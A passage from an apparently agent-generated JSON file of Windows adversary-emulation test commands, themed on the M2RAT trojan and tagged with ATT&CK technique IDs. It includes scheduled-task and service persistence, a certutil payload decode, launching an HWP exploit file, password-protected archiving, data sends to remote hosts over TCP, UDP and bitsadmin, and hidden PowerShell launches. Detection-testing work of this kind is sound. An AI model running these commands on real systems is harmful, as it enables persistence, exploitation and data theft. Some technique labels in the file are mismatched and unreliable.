      "command": "cmd.exe /c \"echo M2RAT test\"",
      "description": "Executes cmd.exe with a benign echo containing the M2RAT identifier to simulate remote command execution by the RAT.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a cmd.exe process that prints 'M2RAT test' to the console.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:10.817560",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "c007696b-3cad-448d-9a26-4a82a26cb9e2",
      "ttp_id": "unknown",
      "technique_id": "T1053.005",
      "technique_name": "Remote Access Tools",
      "tactic": "execution",
      "platform": "windows",
      "command": "schtasks /Create /SC ONCE /ST 00:00 /TN \"M2RATTask\" /TR \"cmd.exe /c \\\"echo M2RAT scheduled\\\"\" /F",
      "description": "Creates a scheduled task that runs cmd.exe with an M2RAT marker, simulating persistence via scheduled tasks.",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "A scheduled task named M2RATTask is created; when triggered it runs cmd.exe to echo the marker.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:10.817560",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "369ecb54-9872-41ed-bdbd-eff9a7832ec2",
      "ttp_id": "unknown",
      "technique_id": "T1543.003",
      "technique_name": "Remote Access Tools",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Start-Process -FilePath 'sc.exe' -ArgumentList 'create M2RATService binPath=\\\"cmd.exe /c echo M2RAT service\\\" start= demand' -NoNewWindow; Start-Sleep -Seconds 2; Start-Process -FilePath 'sc.exe' -ArgumentList 'start M2RATService' -NoNewWindow; Start-Sleep -Seconds 5; Start-Process -FilePath 'sc.exe' -ArgumentList 'delete M2RATService' -ErrorAction SilentlyContinue\"",
      "description": "Creates a temporary Windows service that runs cmd.exe with an M2RAT marker, starts it, then cleans up the service.",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "A service named M2RATService is created and started, which launches cmd.exe to echo the marker; after a short delay the service is deleted.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:10.817560",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "7bbd1dec-74a2-4f7b-aa72-da48ac8e10fe",
      "ttp_id": "unknown",
      "technique_id": "T1203",
      "technique_name": "Exploitation of Vulnerability",
      "tactic": "execution",
      "platform": "windows",
      "command": "cmd.exe /c start \"\" \"%TEMP%\\exploit.hwp\"",
      "description": "Basic execution of a malicious HWP file placed in the temporary directory. Simulates a user double\u2011clicking the file, triggering the CVE\u20112017\u20118291 exploit.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "The HWP file is opened by the default HWP viewer; if the file contains the crafted exploit payload, the vulnerable component will execute code. In a test environment the file can be a harmless placeholder.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:11.797504",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "082207d3-0d13-4809-93f0-601092f273e8",
      "ttp_id": "unknown",
      "technique_id": "T1203",
      "technique_name": "Exploitation of Vulnerability",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"$b='TVqQAAMAAAAEAAAA...';[IO.File]::WriteAllBytes('%TEMP%\\\\exploit.hwp',[Convert]::FromBase64String($b));Start-Process '%TEMP%\\\\exploit.hwp'\"",
      "description": "Intermediate technique: writes a Base64\u2011encoded malicious HWP payload to %TEMP% and launches it. Uses only built\u2011in PowerShell cmdlets and avoids external binaries.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "The Base64 string is decoded to a .hwp file on disk and then executed. If the payload is crafted to exploit CVE\u20112017\u20118291, the exploit will run; otherwise the file is benign.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:11.797504",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "be168feb-a5dc-47e7-a892-193b865b6d4e",
      "ttp_id": "unknown",
      "technique_id": "T1203",
      "technique_name": "Exploitation of Vulnerability",
      "tactic": "execution",
      "platform": "windows",
      "command": "schtasks /Create /TN \"UpdateTask\" /TR \"%TEMP%\\exploit.hwp\" /SC ONCE /ST 00:00 /RL HIGHEST /F",
      "description": "Advanced technique: creates a scheduled task that runs the malicious HWP file with highest privileges. Demonstrates persistence and execution via Windows Task Scheduler, a common post\u2011exploitation path for the HWP exploit.",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "A scheduled task named 'UpdateTask' is registered to run the .hwp file at the next minute. When the task triggers, the HWP viewer processes the file, potentially exploiting CVE\u20112017\u20118291. Cleanup can be done with `schtasks /Delete /TN \"UpdateTask\" /F` (use -ErrorAction SilentlyContinue if needed).",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:11.797504",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "12e7948e-7e01-4b51-a52d-05ad3aac249f",
      "ttp_id": "unknown",
      "technique_id": "T1543.003",
      "technique_name": "Create or Modify System Process",
      "tactic": "execution",
      "platform": "windows",
      "command": "copy /Y \"%SystemRoot%\\System32\\cmd.exe\" \"%TEMP%\\lskdjfel.exe\" && sc create LskdjfelService binPath= \"%TEMP%\\lskdjfel.exe\" start= auto",
      "description": "Copies a benign system binary (cmd.exe) to the temporary directory as lskdjfel.exe and registers it as an auto\u2011started Windows service to simulate persistence via a new system process.",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "A file named lskdjfel.exe appears in %TEMP% and a new service named LskdjfelService is created and started.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:12.897092",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "a193255a-7f99-4ed7-bb8a-b8708435d349",
      "ttp_id": "unknown",
      "technique_id": "T1543.003",
      "technique_name": "Create or Modify System Process",
      "tactic": "execution",
      "platform": "windows",
      "command": "echo TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA > \"%TEMP%\\payload.b64\" && certutil -decode \"%TEMP%\\payload.b64\" \"%TEMP%\\lskdjfel.exe\" && schtasks /Create /TN \"LskdjfelTask\" /TR \"%TEMP%\\lskdjfel.exe\" /SC ONLOGON /RL HIGHEST /F",
      "description": "Writes a dummy Base64 string to a temporary file, decodes it with certutil to create lskdjfel.exe, then creates a scheduled task that runs the executable at user logon with highest privileges.",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "A benign executable lskdjfel.exe is created in %TEMP% and a scheduled task named LskdjfelTask is registered to execute it on logon.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:12.897092",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "110ad32e-a2c6-4c22-b227-10a58907d96b",
      "ttp_id": "unknown",
      "technique_id": "T1543.003",
      "technique_name": "Create or Modify System Process",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"$bytes = [Byte[]] (0x4D,0x5A,0x90,0x00,0x03,0x00,0x00,0x00); [IO.File]::WriteAllBytes('%TEMP%\\\\lskdjfel.exe',$bytes); sc create LskdjfelService binPath= '%TEMP%\\\\lskdjfel.exe' start= auto\"",
      "description": "Uses PowerShell to write a minimal PE header byte array to %TEMP%\\lskdjfel.exe and registers it as an auto\u2011started Windows service, demonstrating creation of a new system process without external binaries.",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "A tiny executable file containing a valid PE header is written to %TEMP% and a service named LskdjfelService is created and started.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:12.897092",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "3af001cd-11ad-41dc-a779-7f925c294ef8",
      "ttp_id": "unknown",
      "technique_id": "T1560.001",
      "technique_name": "Archive Collected Data",
      "tactic": "execution",
      "platform": "windows",
      "command": "rar a -hpSecret123 -m1 C:\\Temp\\archive.rar C:\\Temp\\collect.txt",
      "description": "Basic use of rar.exe to archive a single collected file with a password (Secret123) and low compression level (-m1) for quick packaging before exfiltration.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates C:\\Temp\\archive.rar containing collect.txt. The archive is password\u2011protected; no data is exfiltrated.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:13.942298",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "46572e97-0382-437c-b6f7-5f6acd7439ab",
      "ttp_id": "unknown",
      "technique_id": "T1560.001",
      "technique_name": "Archive Collected Data",
      "tactic": "execution",
      "platform": "windows",
      "command": "rar a -hpP@ssw0rd! -m1 -rr5 C:\\Temp\\logs_archive.rar %TEMP%\\*.log",
      "description": "Intermediate example that archives all .log files from the temporary directory, applies a password (P@ssw0rd!), low compression (-m1) and adds recovery records (-rr5) to increase robustness of the archive.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates C:\\Temp\\logs_archive.rar containing every .log file in %TEMP%. The archive is password\u2011protected; the command does not transmit data.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:13.942298",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "8919fae5-697d-4e02-b7f0-124a50cc5865",
      "ttp_id": "unknown",
      "technique_id": "T1560.001",
      "technique_name": "Archive Collected Data",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"& 'C:\\Program Files\\WinRAR\\rar.exe' a -hpComplex!Pass -m1 C:\\Temp\\exfil_archive.rar %TEMP%\\data_*.txt\"",
      "description": "Advanced variation using PowerShell to invoke rar.exe. The command archives all files matching data_*.txt from %TEMP% with a strong password (Complex!Pass) and low compression. PowerShell is used to hide the execution within a script context.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates C:\\Temp\\exfil_archive.rar containing the selected temporary files. The archive is password\u2011protected; no network activity occurs.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:13.942298",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "2fe40c64-c29b-41f2-bf11-aac0a241e003",
      "ttp_id": "unknown",
      "technique_id": "T1048.003",
      "technique_name": "Exfiltration Over Alternative Protocol",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \\\"$mac='00-11-22-33-44-55'; $data='testdata'; $payload=$mac+':'+$data; $client = New-Object System.Net.Sockets.TcpClient('127.0.0.1',4444); $stream=$client.GetStream(); $bytes=[System.Text.Encoding]::ASCII.GetBytes($payload); $stream.Write($bytes,0,$bytes.Length); $stream.Close(); $client.Close()\\\"",
      "description": "Creates a simple TCP connection to localhost on port 4444 and sends a payload that includes a hard\u2011coded MAC address and dummy data. Demonstrates exfiltration over a non\u2011standard protocol using a built\u2011in .NET socket from PowerShell.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A TCP socket is opened to 127.0.0.1:4444, the string \"00-11-22-33-44-55:testdata\" is transmitted, and the connection is closed. No persistent changes are made to the system.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:16.290602",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "7e272e2c-af94-47a5-9891-8edf558587fa",
      "ttp_id": "unknown",
      "technique_id": "T1048.003",
      "technique_name": "Exfiltration Over Alternative Protocol",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \\\"$mac='AA-BB-CC-DD-EE-FF'; $ts=Get-Date -Format 'yyyyMMddHHmmss'; $result='exfil_result_'+$ts; $payload=$mac+'|'+$result+'|sensitive'; $udp = New-Object System.Net.Sockets.UdpClient; $udp.Connect('192.168.1.100',5555); $bytes=[System.Text.Encoding]::ASCII.GetBytes($payload); $udp.Send($bytes,$bytes.Length); $udp.Close()\\\"",
      "description": "Generates a timestamped identifier prefixed with \"exfil_result_\" and combines it with a MAC address. The combined string is sent via UDP to a remote host, illustrating the use of result_ patterns in command\u2011line arguments for exfiltration.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "A UDP packet containing something like \"AA-BB-CC-DD-EE-FF|exfil_result_20241015123045|sensitive\" is transmitted to 192.168.1.100 on port 5555. The script exits after closing the socket.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:16.290602",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "97ba60b2-8812-437f-b4e1-de360962468b",
      "ttp_id": "unknown",
      "technique_id": "T1048.003",
      "technique_name": "Exfiltration Over Alternative Protocol",
      "tactic": "execution",
      "platform": "windows",
      "command": "cmd /c \\\"echo ExfiltrationTest > %TEMP%\\\\dummy.txt && bitsadmin /transfer \\\\\\\"job_00-11-22-33-44-55_exfil\\\\\\\" /upload %TEMP%\\\\dummy.txt \\\\\\\\\\\\\\\\192.168.1.200\\\\share\\\\exfil_dummy.txt\\\"",
      "description": "Creates a temporary file with benign content and uses the built\u2011in BitsAdmin utility to upload it to a remote SMB share. The job name embeds a MAC address, providing a suspicious identifier that can be detected in process arguments.",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "A file named dummy.txt containing \"ExfiltrationTest\" is written to the %TEMP% directory, then BitsAdmin initiates an upload job named \"job_00-11-22-33-44-55_exfil\" that transfers the file to \\\\192.168.1.200\\share\\exfil_dummy.txt. No cleanup is performed, leaving the dummy file in %TEMP%.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:16.290602",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "bd26ecf9-66ea-4117-b086-3f8cbbf6b351",
      "ttp_id": "unknown",
      "technique_id": "T1055",
      "technique_name": "Process Injection",
      "tactic": "execution",
      "platform": "windows",
      "command": "explorer.exe powershell.exe -NoProfile -WindowStyle Hidden -Command \\\"Write-Host 'Injected via explorer'\\\"",
      "description": "Uses explorer.exe to launch a hidden PowerShell process that writes a test message. Demonstrates explorer spawning an uncommon child process (PowerShell) as seen in process\u2011injection activity.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A PowerShell instance runs under explorer.exe and outputs \"Injected via explorer\" to the console (or host). No persistence or system changes are made.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:17.483325",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "47d6de17-dd1d-4a5f-9a4c-850228b4a6d6",
      "ttp_id": "unknown",
      "technique_id": "T1055",
      "technique_name": "Process Injection",
      "tactic": "execution",
      "platform": "windows",
      "command": "explorer.exe cmd.exe /c start \\\"\\\" powershell.exe -NoProfile -WindowStyle Hidden -Command \\\"Write-Host 'Injection via cmd'\\\"",
      "description": "Invokes explorer.exe to start cmd.exe, which then launches a hidden PowerShell process that prints a test string. Shows a multi\u2011stage launch chain (explorer \u2192 cmd \u2192 PowerShell) that mimics injection techniques.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A PowerShell process is created as a child of cmd.exe (which itself is a child of explorer.exe) and displays \"Injection via cmd\". No files are written or modified.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:17.483325",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "105a0b3f-b082-4a87-9d7d-7dc3a5092d3c",
      "ttp_id": "unknown",
      "technique_id": "T1055",
      "technique_name": "Process Injection",
      "tactic": "execution",
      "platform": "windows",
      "command": "explorer.exe rundll32.exe user32.dll,MessageBoxA 0 \\\"Injection Alert\\\" \\\"From Explorer\\\"",
      "description": "Uses explorer.exe to launch rundll32.exe with the MessageBoxA function, causing a message box to appear. Demonstrates explorer spawning an uncommon utility (rundll32) often used for injection payload delivery.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A message box titled \"Injection Alert\" with the text \"From Explorer\" appears, confirming that rundll32.exe was executed as a child of explorer.exe. No persistent changes are made.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:17.483325",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "d357ac97-a088-4ba6-8d19-0de71de45cc5",
      "ttp_id": "unknown",
      "technique_id": "T1055.012",
      "technique_name": "Process Hollowing",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil -decode %TEMP%\\hollow.dll.b64 %TEMP%\\hollow.dll; rundll32.exe %TEMP%\\hollow.dll,Run",
      "description": "Decodes a base\u201164 encoded benign DLL (placeholder for a payload) to the temporary directory and loads it with\u202frundll32.exe, simulating the loading phase of process hollowing against explorer.exe.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "The DLL is loaded into a new rundll32 process; no malicious code is executed and the system remains stable.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:20.255978",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "c4c5c4cb-5a62-40df-a84c-d7435d6d561d",
      "ttp_id": "unknown",
      "technique_id": "T1055.012",
      "technique_name": "Process Hollowing",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Start-Process -FilePath 'explorer.exe' -WindowStyle Hidden -PassThru | ForEach-Object { Write-Host 'Started explorer.exe (PID: ' + $_.Id + ') \u2013 placeholder for process hollowing' }\"",
      "description": "Creates a hidden explorer.exe process and prints its PID. This command represents the first step of process hollowing (creating a target process) without performing any memory manipulation.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "A new hidden explorer.exe instance is launched; the script outputs its PID. No injection or payload execution occurs.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:20.255978",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "4c8b0060-b2c9-4d6c-972c-aae2fb645b27",
      "ttp_id": "unknown",
      "technique_id": "T1055.012",
      "technique_name": "Process Hollowing",
      "tactic": "execution",
      "platform": "windows",
      "command": "sc create HollowSvc binPath= \"cmd /c powershell -NoProfile -ExecutionPolicy Bypass -Command \\\"Write-Host 'Simulated hollowing of explorer.exe'; Start-Process explorer.exe -WindowStyle Hidden\\\"\" start= auto && sc start HollowSvc && sc delete HollowSvc >nul 2>&1",
      "description": "Creates a temporary Windows service that runs a PowerShell command simulating process hollowing of explorer.exe, starts the service, and then removes it. This demonstrates a more advanced, privilege\u2011requiring execution path.",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "The service is created and started; the PowerShell payload prints a message and launches a hidden explorer.exe. The service is then deleted. No real malicious code is injected.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:20.255978",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "8efd29c3-2cc3-4476-8799-87d2f190cda0",
      "ttp_id": "unknown",
      "technique_id": "T1059.003",
      "technique_name": "Server Software",
      "tactic": "execution",
      "platform": "windows",
      "command": "cmd.exe /c \"echo Test > %TEMP%\\test.txt\"",
      "description": "Launches cmd.exe to write a benign test string to a temporary file, simulating a command\u2011line interpreter invocation by the RAT.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A file named test.txt containing the word \"Test\" is created in the %TEMP% directory.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:21.221245",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "73d83ca6-b1d9-47ad-8d08-f8e305fb8b55",
      "ttp_id": "unknown",
      "technique_id": "T1059.003",
      "technique_name": "Server Software",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Start-Process cmd.exe -ArgumentList '/c echo PowerShell Test > %TEMP%\\ps_test.txt'\"",
      "description": "Uses PowerShell to spawn a cmd.exe process that writes a test string to a temporary file, demonstrating a PowerShell\u2011initiated command\u2011shell execution.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A file named ps_test.txt containing the word \"PowerShell Test\" is created in the %TEMP% directory.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:21.221245",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "dfcc6ebe-a019-4e33-87ee-b8bc34938b6f",
      "ttp_id": "unknown",
      "technique_id": "T1059.003",
      "technique_name": "Server Software",
      "tactic": "execution",
      "platform": "windows",
      "command": "sc.exe create M2RATService binPath= \"cmd.exe /c echo Service Test > %TEMP%\\svc_test.txt\" start= auto && sc.exe start M2RATService",
      "description": "Creates a Windows service that runs cmd.exe to write a test string, then starts the service. This mimics a malicious actor using a service to persistently execute commands via the RAT.",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "A new service named M2RATService is created and started; it creates svc_test.txt in %TEMP% containing the word \"Service Test\" and then exits.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:21.221245",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "9b605bc5-05c7-4882-9117-0e2589cc5358",
      "ttp_id": "unknown",
      "technique_id": "T1074.001",
      "technique_name": "Data Staging",
      "tactic": "execution",
      "platform": "windows",
      "command": "cmd /c \"copy C:\\Windows\\System32\\drivers\\etc\\hosts %TEMP%\\2023_09_01_12_00_00.txt\"",
      "description": "Copies a benign file (hosts) to the %TEMP% directory using a timestamped filename. Demonstrates basic data staging by creating a file in the staging location.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A new file named 2023_09_01_12_00_00.txt appears in the user's temporary folder containing a copy of the hosts file.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:22.421028",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "8a843823-6e64-4b06-88e9-857401c49134",
      "ttp_id": "unknown",
      "technique_id": "T1074.001",
      "technique_name": "Data Staging",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"$ts = Get-Date -Format 'yyyy_MM_dd_HH_mm_ss'; $path = \\\"$env:TEMP\\\\$ts.txt\\\"; Set-Content -Path $path -Value 'Sample staged data' -Force\"",
      "description": "Creates a timestamped file in %TEMP% and writes a test string to it. Uses PowerShell's Set-Content with -Force for reliable file creation.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A file named like 2025_12_21_14_30_45.txt is created in the temporary directory containing the text \"Sample staged data\".",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:22.421028",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "b0fa5041-762f-4590-9fa0-bba47b2e3ea2",
      "ttp_id": "unknown",
      "technique_id": "T1074.001",
      "technique_name": "Data Staging",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"$ts = Get-Date -Format 'yyyy_MM_dd_HH_mm_ss'; $b64File = \\\"$env:TEMP\\\\$ts.b64\\\"; [IO.File]::WriteAllText($b64File, 'VGhpcyBpcyBhIHRlc3QgZGF0YQ=='); $zipFile = \\\"$env:TEMP\\\\$ts.zip\\\"; Compress-Archive -Path $b64File -DestinationPath $zipFile -Force\"",
      "description": "Writes a Base64\u2011encoded test string to a timestamped .b64 file in %TEMP% and then archives it with Compress-Archive. Shows a more advanced staging step (encoding then compressing).",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Two files appear in the temporary folder: a .b64 file containing the encoded string and a .zip file that archives the .b64 file.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:22.421028",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "bbc98b76-ca14-4273-ad1a-a9c1b18893f5",
      "ttp_id": "unknown",
      "technique_id": "T1015",
      "technique_name": "Application Window Discovery",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Get-Process | Where-Object { $_.MainWindowTitle } | Select-Object Id, ProcessName, MainWindowTitle\"",
      "description": "Basic enumeration of visible application windows using the MainWindowTitle property of running processes.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Outputs a table of Process ID, Process Name, and the window title for each process that has an associated UI window.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:23.385058",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "b1afcf56-29d1-4ff7-865d-0b7ec8d0339d",
      "ttp_id": "unknown",
      "technique_id": "T1015",
      "technique_name": "Application Window Discovery",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Add-Type @'\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n    public delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);\n    [DllImport('user32.dll')]\n    public static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);\n    [DllImport('user32.dll')]\n    public static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder lpString, int nMaxCount);\n    [DllImport('user32.dll')]\n    public static extern bool IsWindowVisible(IntPtr hWnd);\n}\n'@;\n$windows = @();\n[Win32]::EnumWindows({ param($hWnd, $lParam)\n    if ([Win32]::IsWindowVisible($hWnd)) {\n        $sb = New-Object System.Text.StringBuilder 256;\n        [Win32]::GetWindowText($hWnd, $sb, $sb.Capacity) | Out-Null;\n        $title = $sb.ToString();\n        if ($title) { $windows += $title }\n    }\n    return $true;\n}, [IntPtr]::Zero);\n$windows | Sort-Object | Get-Unique\"",
      "description": "Intermediate method that directly calls the Windows API (EnumWindows, GetWindowText) to list all visible window titles on the system.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Prints a newline\u2011separated list of all visible top\u2011level window titles (e.g., \"Untitled - Notepad\", \"Microsoft Word\", etc.).",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:23.385058",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "be999514-dcfe-4bb6-9d35-04756f8fdfba",
      "ttp_id": "unknown",
      "technique_id": "T1015",
      "technique_name": "Application Window Discovery",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil -decode %TEMP%\\phone_device_manager.b64 %TEMP%\\PhoneDeviceManager.exe -ErrorAction SilentlyContinue; %TEMP%\\PhoneDeviceManager.exe -enumerate-windows -output %TEMP%\\window_list.txt",
      "description": "Advanced scenario using a benign placeholder binary (PhoneDeviceManager.exe) that mimics the real tool used for Application Window Discovery. The binary is created from a Base64\u2011encoded stub and then executed to dump window titles to a file.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a dummy executable from the Base64 file, runs it with flags to enumerate open windows, and writes the list of window titles to %TEMP%\\window_list.txt.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:23.385058",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "64b56de8-1375-4303-b1eb-f6df1c7654e2",
      "ttp_id": "unknown",
      "technique_id": "T1056.001",
      "technique_name": "Input Capture",
      "tactic": "execution",
      "platform": "windows",
      "command": "cmd /c start \"\" \"%TEMP%\\M2RAT.exe\"",
      "description": "Launches a dummy M2RAT executable from the temporary directory to simulate an input\u2011capture payload.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "The M2RAT.exe process starts in a new window and would begin capturing keyboard/mouse input if it were a real keylogger.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:25.013470",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "56007e0c-4c17-49a2-b281-617615b37a4e",
      "ttp_id": "unknown",
      "technique_id": "T1056.001",
      "technique_name": "Input Capture",
      "tactic": "execution",
      "platform": "windows",
      "command": "regsvr32 /s /n \"%TEMP%\\PhoneDeviceManager.dll\"",
      "description": "Registers a benign DLL (named like the target library) using regsvr32 to emulate loading of PhoneDeviceManager.pdb, a typical indicator of input capture on mobile\u2011related Windows tooling.",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "The DLL is silently registered; any code inside it would be loaded into the regsvr32 process, mimicking the behavior of malicious input\u2011capture modules.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:25.013470",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "921a6f6f-da98-4dcc-99df-35aaa0ffac86",
      "ttp_id": "unknown",
      "technique_id": "T1056.001",
      "technique_name": "Input Capture",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Start-Process -FilePath \\\"$env:TEMP\\\\M2RAT.exe\\\" -WindowStyle Hidden\"",
      "description": "Uses PowerShell to start the M2RAT executable with a hidden window, representing a stealthier launch of an input\u2011capture component.",
